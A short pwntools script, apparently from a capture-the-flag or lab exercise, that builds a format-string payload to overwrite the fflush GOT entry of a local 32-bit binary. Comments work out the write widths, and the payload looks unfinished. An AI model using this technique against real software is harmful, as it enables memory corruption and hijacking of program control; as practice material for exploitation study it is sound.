from pwn import *
target = process('./32_new')

gdb.attach(target, gdbscript='b *0x080487dc')

# Write to addr from small value to largest

# Write one byte. Need to write 0x******0b
fflush_adr0 = p32(0x804a028)

#Write 3 bytes. Need to write 0x****0478
fflush_adr1 = p32(0x804a029)

# write 4 bytes. Need to write 0x********80
fflush_adr2 = p32(0x804a02b)

# Input is offset at stack+10
fmt_string0 = b"%10$n"
fmt_string1 = b"%11$n"
fmt_string2 = b"%12$n"

payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2

target.sendline(payload)

target.interactive()

# Ran x/x 0x0804a028 i.e fflush@got.plt, got 0x52005252
# So 52 bytes were writed to when the $n where reached.
# Doing math first byte 0x10b - 0x52 = 0xb9 (write) 185
# Second - third byte  0x0487 - 0x10b = 0x37c (write) 892
# forth byte: 0x0508 - 0x0487 = 0x81 (write) 129